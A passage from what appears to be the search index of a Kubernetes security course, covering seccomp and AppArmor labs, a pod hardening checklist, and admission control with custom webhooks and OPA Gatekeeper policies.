<p>Verify pod running: <pre><code>kubectl get pod -n lab-restricted\nkubectl describe pod good-pod -n lab-restricted\n</code></pre></p> </li> </ol>"},{"location":"06-pod-security/#lab-2-seccomp-profile-creation","title":"Lab 2: Seccomp Profile Creation","text":"<p>Objective: Create and apply a custom seccomp profile.</p> <p>Steps:</p> <ol> <li> <p>Create audit profile: <pre><code>sudo mkdir -p /var/lib/kubelet/seccomp/profiles\n\ncat &lt;&lt;EOF | sudo tee /var/lib/kubelet/seccomp/profiles/audit.json\n{\n  \"defaultAction\": \"SCMP_ACT_LOG\",\n  \"architectures\": [\"SCMP_ARCH_X86_64\"],\n  \"syscalls\": [\n    {\n      \"names\": [\"accept\", \"bind\", \"connect\", \"read\", \"write\"],\n      \"action\": \"SCMP_ACT_ALLOW\"\n    }\n  ]\n}\nEOF\n</code></pre></p> </li> <li> <p>Deploy pod with profile: <pre><code>cat &lt;&lt;EOF | kubectl apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: seccomp-test\nspec:\n  securityContext:\n    seccompProfile:\n      type: Localhost\n      localhostProfile: profiles/audit.json\n  containers:\n  - name: test\n    image: busybox\n    command: [\"sleep\", \"3600\"]\nEOF\n</code></pre></p> </li> <li> <p>Monitor syscalls: <pre><code># View audit logs\nkubectl exec seccomp-test -- dmesg | grep seccomp\n</code></pre></p> </li> </ol>"},{"location":"06-pod-security/#lab-3-apparmor-profile","title":"Lab 3: AppArmor Profile","text":"<p>Objective: Create and enforce an AppArmor profile.</p> <p>Steps:</p> <ol> <li> <p>Create profile on node: <pre><code>cat &lt;&lt;EOF | sudo tee /etc/apparmor.d/k8s-deny-write\n#include &lt;tunables/global&gt;\n\nprofile k8s-deny-write flags=(attach_disconnected,mediate_deleted) {\n  #include &lt;abstractions/base&gt;\n\n  file,\n\n  # Deny all write operations\n  deny /** w,\n\n  # Allow reads\n  /** r,\n}\nEOF\n</code></pre></p> </li> <li> <p>Load profile: <pre><code>sudo apparmor_parser -r -W /etc/apparmor.d/k8s-deny-write\nsudo aa-status | grep k8s-deny-write\n</code></pre></p> </li> <li> <p>Deploy pod with AppArmor: <pre><code>cat &lt;&lt;EOF | kubectl apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: apparmor-test\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/test: localhost/k8s-deny-write\nspec:\n  containers:\n  - name: test\n    image: busybox\n    command: [\"sleep\", \"3600\"]\nEOF\n</code></pre></p> </li> <li> <p>Test enforcement: <pre><code># Should succeed (read)\nkubectl exec apparmor-test -- cat /etc/hostname\n\n# Should fail (write)\nkubectl exec apparmor-test -- touch /tmp/test\n</code></pre></p> </li> </ol>"},{"location":"06-pod-security/#lab-4-complete-secure-deployment","title":"Lab 4: Complete Secure Deployment","text":"<p>Objective: Create a production-ready secure deployment.</p> <p>Create deployment: <pre><code>cat &lt;&lt;EOF | kubectl apply -f -\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: secure-prod\n  labels:\n    pod-security.kubernetes.io/enforce: restricted\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: secure-app\n  namespace: secure-prod\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: secure-app\n  template:\n    metadata:\n      labels:\n        app: secure-app\n    spec:\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 1000\n        fsGroup: 2000\n        seccompProfile:\n          type: RuntimeDefault\n      containers:\n      - name: app\n        image: nginx:1.25-alpine\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          runAsNonRoot: true\n          runAsUser: 1000\n          capabilities:\n            drop:\n            - ALL\n        ports:\n        - containerPort: 8080\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        volumeMounts:\n        - name: cache\n          mountPath: /var/cache/nginx\n        - name: run\n          mountPath: /var/run\n      volumes:\n      - name: cache\n        emptyDir: {}\n      - name: run\n        emptyDir: {}\nEOF\n</code></pre></p> <p>Verify security: <pre><code>kubectl get deployment -n secure-prod\nkubectl describe pod -n secure-prod | grep -A 10 \"Security Context\"\n</code></pre></p>"},{"location":"06-pod-security/#11-security-checklist","title":"11. Security Checklist","text":""},{"location":"06-pod-security/#pre-deployment-security-audit","title":"Pre-Deployment Security Audit","text":"<ul> <li>[ ] Pod Security Standards</li> <li>[ ] Namespace has PSA labels configured</li> <li>[ ] Enforcement level appropriate (restricted for prod)</li> <li> <p>[ ] Exemptions documented and minimal</p> </li> <li> <p>[ ] Security Context</p> </li> <li>[ ] runAsNonRoot: true</li> <li>[ ] runAsUser set to non-zero UID</li> <li>[ ] allowPrivilegeEscalation: false</li> <li>[ ] readOnlyRootFilesystem: true (with required writable mounts)</li> <li>[ ] All capabilities dropped, only required added</li> <li>[ ] No privileged: true</li> <li> <p>[ ] No hostNetwork, hostPID, hostIPC</p> </li> <li> <p>[ ] Seccomp/AppArmor/SELinux</p> </li> <li>[ ] Seccomp profile configured (RuntimeDefault minimum)</li> <li>[ ] AppArmor profile applied (if available)</li> <li> <p>[ ] SELinux context appropriate</p> </li> <li> <p>[ ] Resource Management</p> </li> <li>[ ] CPU limits and requests defined</li> <li>[ ] Memory limits and requests defined</li> <li> <p>[ ] Storage limits on emptyDir volumes</p> </li> <li> <p>[ ] Image Security</p> </li> <li>[ ] Using specific image tags (not latest)</li> <li>[ ] Images from trusted registries</li> <li>[ ] Image scanned for vulnerabilities</li> <li> <p>[ ] Minimal base image (distroless/alpine)</p> </li> <li> <p>[ ] Network Security</p> </li> <li>[ ] Network policies defined</li> <li>[ ] Ingress/egress rules restrictive</li> <li> <p>[ ] No unnecessary exposed ports</p> </li> <li> <p>[ ] Volumes</p> </li> <li>[ ] No hostPath volumes (unless absolutely required)</li> <li>[ ] Sensitive data in Secrets, not ConfigMaps</li> <li> <p>[ ] Volume mounts have appropriate permissions</p> </li> <li> <p>[ ] Monitoring</p> </li> <li>[ ] Logging configured</li> <li>[ ] Security events monitored</li> <li>[ ] Alerts for policy violations</li> </ul>"},{"location":"06-pod-security/#12-references","title":"12. References","text":""},{"location":"06-pod-security/#official-documentation","title":"Official Documentation","text":"<ol> <li>Kubernetes Pod Security Standards</li> <li> <p>https://kubernetes.io/docs/concepts/security/pod-security-standards/</p> </li> <li> <p>Pod Security Admission</p> </li> <li> <p>https://kubernetes.io/docs/concepts/security/pod-security-admission/</p> </li> <li> <p>Security Context</p> </li> <li> <p>https://kubernetes.io/docs/tasks/configure-pod-container/security-context/</p> </li> <li> <p>Seccomp</p> </li> <li> <p>https://kubernetes.io/docs/tutorials/security/seccomp/</p> </li> <li> <p>AppArmor</p> </li> <li>https://kubernetes.io/docs/tutorials/security/apparmor/</li> </ol>"},{"location":"06-pod-security/#security-frameworks","title":"Security Frameworks","text":"<ol> <li>CIS Kubernetes Benchmark v1.8</li> <li> <p>https://www.cisecurity.org/benchmark/kubernetes</p> </li> <li> <p>NSA/CISA Kubernetes Hardening Guide</p> </li> <li> <p>https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF</p> </li> <li> <p>NIST SP 800-190 - Container Security</p> </li> <li> <p>https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-190.pdf</p> </li> <li> <p>CNCF Security TAG - Cloud Native Security Whitepaper</p> </li> <li>https://github.com/cncf/tag-security/tree/main/security-whitepaper</li> </ol>"},{"location":"06-pod-security/#linux-security","title":"Linux Security","text":"<ol> <li> <p>Linux Capabilities Man Page</p> <ul> <li>https://man7.org/linux/man-pages/man7/capabilities.7.html</li> </ul> </li> <li> <p>Seccomp BPF</p> <ul> <li>https://www.kernel.org/doc/html/latest/userspace-api/seccomp_filter.html</li> </ul> </li> <li> <p>AppArmor Documentation</p> <ul> <li>https://gitlab.com/apparmor/apparmor/-/wikis/Documentation</li> </ul> </li> <li> <p>SELinux Project</p> <ul> <li>https://github.com/SELinuxProject/selinux</li> </ul> </li> </ol>"},{"location":"06-pod-security/#tools","title":"Tools","text":"<ol> <li> <p>kubesec - Security risk analysis</p> <ul> <li>https://kubesec.io/</li> </ul> </li> <li> <p>kube-bench - CIS benchmark checker</p> <ul> <li>https://github.com/aquasecurity/kube-bench</li> </ul> </li> <li> <p>Polaris - Kubernetes best practices</p> <ul> <li>https://github.com/FairwindsOps/polaris</li> </ul> </li> </ol>"},{"location":"06-pod-security/#next-steps","title":"Next Steps","text":"<p>Continue to Module 07: Admission Control and Policy to learn about policy enforcement, admission webhooks, OPA/Gatekeeper, and Kyverno for cluster-wide security governance.</p> <p>Module Completion Status: \u2705 Complete</p>"},{"location":"07-admission-policy/","title":"Module 07: Admission Control and Policy","text":""},{"location":"07-admission-policy/#overview","title":"Overview","text":"<p>Estimated Time: 6-7 hours</p> <p>Module Type: Security Deep Dive</p> <p>Prerequisites: - Module 02 - Control Plane and Cluster Components - Module 05 - Authentication and Authorization - Module 06 - Pod Security - Understanding of webhooks and REST APIs</p> <p>Admission control is Kubernetes' last line of defense before objects are persisted to etcd. This module explores admission controllers, validating and mutating webhooks, and policy engines (OPA/Gatekeeper and Kyverno) for enforcing organizational security policies. You'll learn to implement policy-as-code patterns, create custom admission policies, and build defense-in-depth security controls for production clusters.</p>"},{"location":"07-admission-policy/#learning-objectives","title":"Learning Objectives","text":"<p>By the end of this module, you will be able to:</p> <ol> <li>Understand the admission control architecture and request flow</li> <li>Configure and use built-in admission controllers</li> <li>Create ValidatingWebhookConfiguration and MutatingWebhookConfiguration</li> <li>Deploy and configure OPA/Gatekeeper with Rego policies</li> <li>Implement Kyverno for policy management</li> <li>Write policy-as-code for security enforcement</li> <li>Validate container images, labels, and resource configurations</li> <li>Create mutation policies for automatic remediation</li> <li>Implement policy reporting and compliance monitoring</li> <li>Troubleshoot admission webhook failures</li> </ol>"},{"location":"07-admission-policy/#1-admission-control-architecture","title":"1. Admission Control Architecture","text":""},{"location":"07-admission-policy/#11-admission-control-flow","title":"1.1 Admission Control Flow","text":"<pre><code>graph TB\n    A[API Request] --&gt; B[Authentication]\n    B --&gt; C[Authorization]\n    C --&gt; D{Admission&lt;br/&gt;Controllers}\n\n    D --&gt; E[Mutating&lt;br/&gt;Admission]\n    E --&gt; F[Object Schema&lt;br/&gt;Validation]\n    F --&gt; G[Validating&lt;br/&gt;Admission]\n\n    G --&gt; H{All Checks&lt;br/&gt;Pass?}\n    H --&gt;|Yes| I[Persist to etcd]\n    H --&gt;|No| J[Request Rejected]\n\n    E -.-&gt;|Modify Object| E\n\n    style E fill:#ffd93d\n    style G fill:#6bcf7f\n    style J fill:#ff6b6b\n    style I fill:#6bcf7f</code></pre>"},{"location":"07-admission-policy/#12-admission-phases","title":"1.2 Admission Phases","text":"<p>Phase 1: Mutating Admission - Modifies objects before validation - Can set defaults, inject sidecars, add labels - Multiple mutators execute in sequence - Changes must pass validation phase</p> <p>Phase 2: Object Schema Validation - Validates against OpenAPI schema - Ensures required fields present - Type checking and format validation</p> <p>Phase 3: Validating Admission - Validates business logic and policies - Cannot modify objects - All validators must approve - Any rejection blocks the request</p>"},{"location":"07-admission-policy/#13-admission-controller-types","title":"1.3 Admission Controller Types","text":"<p>Built-in Admission Controllers: - Compiled into kube-apiserver - Enabled/disabled via API server flags - Examples: PodSecurity, ResourceQuota, LimitRanger</p> <p>Dynamic Admission Controllers: - External webhooks - ValidatingWebhookConfiguration - MutatingWebhookConfiguration - Custom logic in external services</p> <p>View Enabled Admission Controllers: <pre><code># Check API server configuration\nkubectl -n kube-system get pod &lt;apiserver-pod&gt; -o yaml | grep enable-admission-plugins\n\n# Or check API server process\nps aux | grep kube-apiserver | grep admission-plugins\n</code></pre></p>"},{"location":"07-admission-policy/#2-built-in-admission-controllers","title":"2. Built-in Admission Controllers","text":""},{"location":"07-admission-policy/#21-common-built-in-controllers","title":"2.1 Common Built-in Controllers","text":"Controller Type Purpose PodSecurity Validating Enforces Pod Security Standards NamespaceLifecycle Validating Prevents operations on terminating namespaces LimitRanger Validating Enforces LimitRange constraints ResourceQuota Validating Enforces resource quotas ServiceAccount Mutating Adds default service account DefaultStorageClass Mutating Adds default storage class to PVCs MutatingAdmissionWebhook Mutating Calls external mutating webhooks ValidatingAdmissionWebhook Validating Calls external validating webhooks NodeRestriction Validating Limits node's ability to modify objects PodNodeSelector Mutating Applies node selectors to pods"},{"location":"07-admission-policy/#22-limitranger-example","title":"2.2 LimitRanger Example","text":"<p>Create LimitRange: <pre><code>apiVersion: v1\nkind: LimitRange\nmetadata:\n  name: resource-limits\n  namespace: production\nspec:\n  limits:\n  # Container-level defaults and constraints\n  - type: Container\n    default:\n      cpu: 500m\n      memory: 512Mi\n    defaultRequest:\n      cpu: 250m\n      memory: 256Mi\n    max:\n      cpu: 2000m\n      memory: 2Gi\n    min:\n      cpu: 100m\n      memory: 64Mi\n\n  # Pod-level constraints\n  - type: Pod\n    max:\n      cpu: 4000m\n      memory: 4Gi\n\n  # PVC size constraints\n  - type: PersistentVolumeClaim\n    max:\n      storage: 10Gi\n    min:\n      storage: 1Gi\n</code></pre></p> <p>Apply and test: <pre><code>kubectl apply -f limitrange.yaml\n\n# Deploy pod without resource requests\ncat &lt;&lt;EOF | kubectl apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: test-limits\n  namespace: production\nspec:\n  containers:\n  - name: app\n    image: nginx:1.25\nEOF\n\n# Check applied defaults\nkubectl get pod test-limits -n production -o yaml | grep -A 10 resources\n</code></pre></p>"},{"location":"07-admission-policy/#23-resourcequota-example","title":"2.3 ResourceQuota Example","text":"<p>Create ResourceQuota: <pre><code>apiVersion: v1\nkind: ResourceQuota\nmetadata:\n  name: team-quota\n  namespace: team-a\nspec:\n  hard:\n    # Compute resources\n    requests.cpu: \"10\"\n    requests.memory: 20Gi\n    limits.cpu: \"20\"\n    limits.memory: 40Gi\n\n    # Storage resources\n    requests.storage: 100Gi\n    persistentvolumeclaims: \"10\"\n\n    # Object counts\n    pods: \"50\"\n    services: \"10\"\n    secrets: \"20\"\n    configmaps: \"20\"\n\n    # Custom resources\n    count/deployments.apps: \"10\"\n    count/jobs.batch: \"20\"\n</code></pre></p> <p>Verify quota usage: <pre><code>kubectl describe quota team-quota -n team-a\n</code></pre></p>"},{"location":"07-admission-policy/#24-enabling-admission-controllers","title":"2.4 Enabling Admission Controllers","text":"<p>Modify API server configuration: <pre><code># /etc/kubernetes/manifests/kube-apiserver.yaml\nspec:\n  containers:\n  - command:\n    - kube-apiserver\n    - --enable-admission-plugins=NodeRestriction,PodSecurity,LimitRanger,ResourceQuota,ServiceAccount,DefaultStorageClass,MutatingAdmissionWebhook,ValidatingAdmissionWebhook\n    - --disable-admission-plugins=AlwaysAdmit\n</code></pre></p>"},{"location":"07-admission-policy/#3-validating-webhooks","title":"3. Validating Webhooks","text":""},{"location":"07-admission-policy/#31-validatingwebhookconfiguration","title":"3.1 ValidatingWebhookConfiguration","text":"<p>Validating webhooks allow external services to approve or reject admission requests.</p> <p>Architecture: <pre><code>sequenceDiagram\n    participant Client\n    participant API Server\n    participant Webhook Service\n\n    Client-&gt;&gt;API Server: Create/Update Request\n    API Server-&gt;&gt;API Server: Authentication &amp; Authorization\n    API Server-&gt;&gt;API Server: Mutating Admission\n    API Server-&gt;&gt;Webhook Service: AdmissionReview Request\n\n    alt Valid Request\n        Webhook Service-&gt;&gt;API Server: AdmissionReview Response (Allowed: true)\n        API Server-&gt;&gt;API Server: Persist to etcd\n        API Server-&gt;&gt;Client: Success Response\n    else Invalid Request\n        Webhook Service-&gt;&gt;API Server: AdmissionReview Response (Allowed: false)\n        API Server-&gt;&gt;Client: Rejection Response\n    end</code></pre></p>"},{"location":"07-admission-policy/#32-creating-a-validating-webhook","title":"3.2 Creating a Validating Webhook","text":"<p>Webhook Service (Python Flask): <pre><code># webhook-server.py\nfrom flask import Flask, request, jsonify\nimport base64\nimport json\n\napp = Flask(__name__)\n\n@app.route('/validate', methods=['POST'])\ndef validate():\n    admission_review = request.json\n\n    # Extract request\n    req = admission_review['request']\n    uid = req['uid']\n\n    # Get object being created/updated\n    obj = req.get('object', {})\n    kind = obj.get('kind', '')\n    metadata = obj.get('metadata', {})\n    spec = obj.get('spec', {})\n\n    # Validation logic\n    allowed = True\n    message = \"Request allowed\"\n\n    # Example: Require 'owner' label\n    labels = metadata.get('labels', {})\n    if 'owner' not in labels:\n        allowed = False\n        message = \"Missing required label 'owner'\"\n\n    # Example: Require resource limits\n    if kind == \"Pod\":\n        containers = spec.get('containers', [])\n        for container in containers:\n            resources = container.get('resources', {})\n            if 'limits' not in resources:\n                allowed = False\n                message = f\"Container {container['name']} missing resource limits\"\n                break\n\n    # Build response\n    response = {\n        \"apiVersion\": \"admission.k8s.io/v1\",\n        \"kind\": \"AdmissionReview\",\n        \"response\": {\n            \"uid\": uid,\n            \"allowed\": allowed,\n            \"status\": {\n                \"message\": message\n            }\n        }\n    }\n\n    return jsonify(response)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8443, ssl_context=('cert.pem', 'key.pem'))\n</code></pre></p> <p>Deployment: <pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: validation-webhook\n  namespace: webhook-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: validation-webhook\n  template:\n    metadata:\n      labels:\n        app: validation-webhook\n    spec:\n      containers:\n      - name: webhook\n        image: myregistry/validation-webhook:1.0\n        ports:\n        - containerPort: 8443\n        volumeMounts:\n        - name: certs\n          mountPath: /etc/webhook/certs\n          readOnly: true\n      volumes:\n      - name: certs\n        secret:\n          secretName: webhook-certs\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: validation-webhook\n  namespace: webhook-system\nspec:\n  selector:\n    app: validation-webhook\n  ports:\n  - port: 443\n    targetPort: 8443\n</code></pre></p>"},{"location":"07-admission-policy/#33-validatingwebhookconfiguration-resource","title":"3.3 ValidatingWebhookConfiguration Resource","text":"<pre><code>apiVersion: admissionregistration.k8s.io/v1\nkind: ValidatingWebhookConfiguration\nmetadata:\n  name: pod-validator\nwebhooks:\n- name: validate.pods.example.com\n  admissionReviewVersions: [\"v1\"]\n\n  # When to call this webhook\n  rules:\n  - apiGroups: [\"\"]\n    apiVersions: [\"v1\"]\n    operations: [\"CREATE\", \"UPDATE\"]\n    resources: [\"pods\"]\n    scope: \"Namespaced\"\n\n  # Webhook endpoint\n  clientConfig:\n    service:\n      name: validation-webhook\n      namespace: webhook-system\n      path: /validate\n      port: 443\n    caBundle: LS0tLS1CRUdJTi... # Base64 encoded CA cert\n\n  # Failure policy\n  failurePolicy: Fail  # or Ignore\n\n  # Timeout\n  timeoutSeconds: 10\n\n  # Side effects\n  sideEffects: None\n\n  # Namespace selector\n  namespaceSelector:\n    matchExpressions:\n    - key: environment\n      operator: In\n      values: [\"production\", \"staging\"]\n\n  # Object selector\n  objectSelector:\n    matchLabels:\n      validate: \"true\"\n</code></pre> <p>Key Configuration Options:</p> Field Description Values failurePolicy Behavior on webhook failure Fail, Ignore sideEffects Whether webhook has side effects None, NoneOnDryRun timeoutSeconds Webhook timeout 1-30 seconds reinvocationPolicy Call webhook multiple times Never, IfNeeded matchPolicy How to match requests Exact, Equivalent"},{"location":"07-admission-policy/#34-generating-webhook-certificates","title":"3.4 Generating Webhook Certificates","text":"<pre><code>#!/bin/bash\n# generate-webhook-certs.sh\n\nNAMESPACE=\"webhook-system\"\nSERVICE=\"validation-webhook\"\n\n# Create CA\nopenssl genrsa -out ca.key 2048\nopenssl req -x509 -new -nodes -key ca.key -days 3650 -out ca.crt -subj \"/CN=webhook-ca\"\n\n# Create server certificate\ncat &gt; server.conf &lt;&lt;EOF\n[req]\nreq_extensions = v3_req\ndistinguished_name = req_distinguished_name\n\n[req_distinguished_name]\n\n[v3_req]\nbasicConstraints = CA:FALSE\nkeyUsage = nonRepudiation, digitalSignature, keyEncipherment\nextendedKeyUsage = serverAuth\nsubjectAltName = @alt_names\n\n[alt_names]\nDNS.1 = ${SERVICE}\nDNS.2 = ${SERVICE}.${NAMESPACE}\nDNS.3 = ${SERVICE}.${NAMESPACE}.svc\nDNS.4 = ${SERVICE}.${NAMESPACE}.svc.cluster.local\nEOF\n\nopenssl genrsa -out server.key 2048\nopenssl req -new -key server.key -out server.csr -subj \"/CN=${SERVICE}.${NAMESPACE}.svc\" -config server.conf\nopenssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt -days 3650 -extensions v3_req -extfile server.conf\n\n# Create Kubernetes secret\nkubectl create secret tls webhook-certs \\\n  --cert=server.crt \\\n  --key=server.key \\\n  -n ${NAMESPACE}\n\n# Output CA bundle for webhook config\necho \"CA Bundle (add to webhookConfig):\"\ncat ca.crt | base64 | tr -d '\\n'\n</code></pre>"},{"location":"07-admission-policy/#4-mutating-webhooks","title":"4. Mutating Webhooks","text":""},{"location":"07-admission-policy/#41-mutatingwebhookconfiguration","title":"4.1 MutatingWebhookConfiguration","text":"<p>Mutating webhooks modify objects before they're persisted.</p> <p>Use Cases: - Inject sidecar containers - Add default labels/annotations - Set security contexts - Add init containers - Modify resource requests/limits</p>"},{"location":"07-admission-policy/#42-example-sidecar-injection-webhook","title":"4.2 Example: Sidecar Injection Webhook","text":"<p>Webhook Logic (Python): <pre><code>@app.route('/mutate', methods=['POST'])\ndef mutate():\n    admission_review = request.json\n    req = admission_review['request']\n    uid = req['uid']\n    obj = req['object']\n\n    # Only inject for pods with annotation\n    annotations = obj.get('metadata', {}).get('annotations', {})\n    if annotations.get('sidecar-injector', '') != 'enabled':\n        return jsonify({\n            \"apiVersion\": \"admission.k8s.io/v1\",\n            \"kind\": \"AdmissionReview\",\n            \"response\": {\n                \"uid\": uid,\n                \"allowed\": True\n            }\n        })\n\n    # Build JSON patch to add sidecar\n    patches = []\n\n    # Add sidecar container\n    sidecar = {\n        \"name\": \"logging-agent\",\n        \"image\": \"fluentd:v1.16\",\n        \"volumeMounts\": [{\n            \"name\": \"logs\",\n            \"mountPath\": \"/var/log/app\"\n        }]\n    }\n\n    containers = obj['spec']['containers']\n    patches.append({\n        \"op\": \"add\",\n        \"path\": \"/spec/containers/-\",\n        \"value\": sidecar\n    })\n\n    # Add shared volume\n    if 'volumes' not in obj['spec']:\n        obj['spec']['volumes'] = []\n\n    patches.append({\n        \"op\": \"add\",\n        \"path\": \"/spec/volumes/-\",\n        \"value\": {\n            \"name\": \"logs\",\n            \"emptyDir\": {}\n        }\n    })\n\n    # Encode patches\n    import base64\n    patch_bytes = json.dumps(patches).encode('utf-8')\n    patch_b64 = base64.b64encode(patch_bytes).decode('utf-8')\n\n    return jsonify({\n        \"apiVersion\": \"admission.k8s.io/v1\",\n        \"kind\": \"AdmissionReview\",\n        \"response\": {\n            \"uid\": uid,\n            \"allowed\": True,\n            \"patchType\": \"JSONPatch\",\n            \"patch\": patch_b64\n        }\n    })\n</code></pre></p>"},{"location":"07-admission-policy/#43-mutatingwebhookconfiguration","title":"4.3 MutatingWebhookConfiguration","text":"<pre><code>apiVersion: admissionregistration.k8s.io/v1\nkind: MutatingWebhookConfiguration\nmetadata:\n  name: sidecar-injector\nwebhooks:\n- name: inject.sidecars.example.com\n  admissionReviewVersions: [\"v1\"]\n\n  rules:\n  - apiGroups: [\"\"]\n    apiVersions: [\"v1\"]\n    operations: [\"CREATE\"]\n    resources: [\"pods\"]\n\n  clientConfig:\n    service:\n      name: sidecar-injector\n      namespace: webhook-system\n      path: /mutate\n    caBundle: LS0tLS1CRUdJTi...\n\n  failurePolicy: Fail\n  sideEffects: None\n  timeoutSeconds: 10\n\n  # Reinvoke if object changed by other mutators\n  reinvocationPolicy: IfNeeded\n\n  namespaceSelector:\n    matchLabels:\n      sidecar-injection: enabled\n</code></pre> <p>Test sidecar injection: <pre><code># Label namespace\nkubectl label namespace default sidecar-injection=enabled\n\n# Create pod with annotation\ncat &lt;&lt;EOF | kubectl apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: test-app\n  annotations:\n    sidecar-injector: enabled\nspec:\n  containers:\n  - name: app\n    image: nginx:1.25\nEOF\n\n# Verify sidecar added\nkubectl get pod test-app -o json | jq '.spec.containers[].name'\n</code></pre></p>"},{"location":"07-admission-policy/#5-opa-gatekeeper","title":"5. OPA Gatekeeper","text":""},{"location":"07-admission-policy/#51-opa-gatekeeper-overview","title":"5.1 OPA Gatekeeper Overview","text":"<p>Open Policy Agent (OPA) Gatekeeper is a policy engine for Kubernetes that uses the Rego policy language.</p> <p>Architecture: <pre><code>graph TB\n    A[Kubernetes API] --&gt; B[Gatekeeper&lt;br/&gt;Admission Webhook]\n    B --&gt; C{OPA Engine}\n    C --&gt; D[Constraint&lt;br/&gt;Templates]\n    C --&gt; E[Constraints]\n    C --&gt; F[Policy Library]\n\n    D --&gt; G[Rego Policies]\n    E --&gt; G\n\n    C --&gt; H{Policy&lt;br/&gt;Decision}\n    H --&gt;|Allow| I[Admit Request]\n    H --&gt;|Deny| J[Reject Request]\n\n    style B fill:#00d4aa\n    style C fill:#00d4aa\n    style I fill:#6bcf7f\n    style J fill:#ff6b6b</code></pre></p>"},{"location":"07-admission-policy/#52-installing-gatekeeper","title":"5.2 Installing Gatekeeper","text":"<p>Using kubectl: <pre><code># Install latest release\nkubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/release-3.14/deploy/gatekeeper.yaml\n\n# Verify installation\nkubectl get pods -n gatekeeper-system\nkubectl get crd | grep gatekeeper\n</code></pre></p> <p>Using Helm: <pre><code>helm repo add gatekeeper https://open-policy-agent.github.io/gatekeeper/charts\nhelm install gatekeeper gatekeeper/gatekeeper --namespace gatekeeper-system --create-namespace\n</code></pre></p>"},{"location":"07-admission-policy/#53-constraint-templates","title":"5.3 Constraint Templates","text":"<p>Constraint Templates define reusable policy logic in Rego.</p> <p>Example: Require Labels Template <pre><code>apiVersion: templates.gatekeeper.sh/v1\nkind: ConstraintTemplate\nmetadata:\n  name: k8srequiredlabels\nspec:\n  crd:\n    spec:\n      names:\n        kind: K8sRequiredLabels\n      validation:\n        openAPIV3Schema:\n          type: object\n          properties:\n            labels:\n              type: array\n              items:\n                type: string\n\n  targets:\n  - target: admission.k8s.gatekeeper.sh\n    rego: |\n      package k8srequiredlabels\n\n      violation[{\"msg\": msg, \"details\": {\"missing_labels\": missing}}] {\n        provided := {label | input.review.object.metadata.labels[label]}\n        required := {label | label := input.parameters.labels[_]}\n        missing := required - provided\n        count(missing) &gt; 0\n        msg := sprintf(\"Missing required labels: %v\", [missing])\n      }\n</code></pre></p> <p>Apply template: <pre><code>kubectl apply -f require-labels-template.yaml\n</code></pre></p>"},{"location":"07-admission-policy/#54-constraints","title":"5.4 Constraints","text":"<p>Constraints instantiate templates with specific parameters.</p> <p>Require 'owner' and 'environment' labels: <pre><code>apiVersion: constraints.gatekeeper.sh/v1beta1\nkind: K8sRequiredLabels\nmetadata:\n  name: require-owner-env-labels\nspec:\n  match:\n    kinds:\n    - apiGroups: [\"\"]\n      kinds: [\"Namespace\", \"Pod\", \"Service\"]\n    - apiGroups: [\"apps\"]\n      kinds: [\"Deployment\", \"StatefulSet\"]\n\n  parameters:\n    labels:\n    - owner\n    - environment\n</code></pre></p> <p>Test constraint: <pre><code># This should fail (missing labels)\ncat &lt;&lt;EOF | kubectl apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.25\nEOF\n\n# This should succeed\ncat &lt;&lt;EOF | kubectl apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\n  labels:\n    owner: john\n    environment: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.25\nEOF\n</code></pre></p>"},{"location":"07-admission-policy/#55-security-policy-examples","title":"5.5 Security Policy Examples","text":"<p>Block Privileged Containers: <pre><code>apiVersion: templates.gatekeeper.sh/v1\nkind: ConstraintTemplate\nmetadata:\n  name: k8spsprivilegedcontainer\nspec:\n  crd:\n    spec:\n      names:\n        kind: K8sPSPrivilegedContainer\n  targets:\n  - target: admission.k8s.gatekeeper.sh\n    rego: |\n      package k8spsprivilegedcontainer\n\n      violation[{\"msg\": msg}] {\n        container := input.review.object.spec.containers[_]\n        container.securityContext.privileged\n        msg := sprintf(\"Privileged container not allowed: %v\", [container.name])\n      }\n---\napiVersion: constraints.gatekeeper.sh/v1beta1\nkind: K8sPSPrivilegedContainer\nmetadata:\n  name: block-privileged-containers\nspec:\n  match:\n    kinds:\n    - apiGroups: [\"\"]\n      kinds: [\"Pod\"]\n</code></pre></p> <p>Require Read-Only Root Filesystem: <pre><code>apiVersion: templates.gatekeeper.sh/v1\nkind: ConstraintTemplate\nmetadata:\n  name: k8sreadonlyrootfilesystem\nspec:\n  crd:\n    spec:\n      names:\n        kind: K8sReadOnlyRootFilesystem\n  targets:\n  - target: admission.k8s.gatekeeper.sh\n    rego: |\n      package k8sreadonlyrootfilesystem\n\n      violation[{\"msg\": msg}] {\n        container := input.review.object.spec.containers[_]\n        not container.securityContext.readOnlyRootFilesystem\n        msg := sprintf(\"Container %v must have readOnlyRootFilesystem: true\", [container.name])\n      }\n---\napiVersion: constraints.gatekeeper.sh/v1beta1\nkind: K8sReadOnlyRootFilesystem\nmetadata:\n  name: require-readonly-root\nspec:\n  match:\n    kinds:\n    - apiGroups: [\"\"]\n      kinds: [\"Pod\"]\n    namespaces:\n    - production\n</code></pre></p> <p>Block Images from Untrusted Registries: <pre><code>apiVersion: templates.gatekeeper.sh/v1\nkind: ConstraintTemplate\nmetadata:\n  name: k8sallowedrepos\nspec:\n  crd:\n    spec:\n      names:\n        kind: 